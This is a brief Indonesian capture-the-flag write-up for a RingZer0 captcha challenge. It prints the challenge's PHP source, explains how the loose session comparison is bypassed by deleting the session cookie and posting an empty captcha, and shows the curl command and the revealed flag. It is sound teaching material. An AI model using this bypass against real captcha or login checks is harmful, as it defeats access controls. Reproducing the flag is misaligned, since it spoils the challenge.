<h1><b>Unreadable captcha</h1></b>
<pre>
Diberikan sebuah link captcha challenger
</pre>
</b><h3>Solution</h3></b>
<p align='justify'>Jika kita membaca captchanya itu merupakan character diluar standard ascii. Lakukan inspect element dan perhatikan paling bawah terdapat file txt yaitu source code
dari challenger tersebut dan buka --> http://challenges.ringzer0team.com:10142/captcha3.txt</p>

```php
<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST'){
	if (isset($_POST['captcha'])){
		if ($_POST['captcha'] == $_SESSION['captcha']){
		echo 'Congrats, the flag is XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' ;  
		} else {
		echo 'You have a wrong captcha. You are not a human. Try again later.';
}
	} else {
   header( 'Location: index.php' ) ;
}

}
else {
   header( 'Location: index.php' ) ;
}
?>
```
<p>Dari program diatas flag dapat diperoleh jika Captcha dilakukan request POST dan captcha-nya berupa Session. Tips hapus session cookie dengan tool edit cookie dan captcha set null, lalu submit maka flag akan muncul atau dengan perintah curl terminal dibawah</p>

```console
root@Python:/home/venom/Downloads# curl http://challenges.ringzer0team.com:10142/captcha3.php --data "captcha="
Congrats, the flag is FLAG-siLqVmuuEDDFtz9jqIFIAOQmCF
root@Python:/home/venom/Downloads# 

```
</b><h3>Flag</h3></b>
<pre>
FLAG-siLqVmuuEDDFtz9jqIFIAOQmCF
</pre>
